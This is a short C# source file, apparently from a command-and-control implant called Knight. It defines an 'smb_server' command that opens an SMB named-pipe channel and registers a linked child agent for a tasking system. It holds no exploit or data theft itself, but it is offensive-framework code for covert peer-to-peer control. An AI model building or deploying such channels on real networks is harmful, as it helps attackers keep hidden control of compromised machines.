using Knight.Models.Comm;
using Knight.Models.Raven;


namespace Knight.Commands
{
    public class SmbServer : KnightCommand
    {
        public override string Name => "smb_server";

        public override string Execute(TaskMessage task)
        {
            var pipename = task.Arguments[0];

            AllyCommModule commModule = new SmbCommModule(pipename);

            Knight.AddChildAlly(task.TaskId, commModule);

            return $"Started SMB Server for this:{pipename}";
        }
    }
}
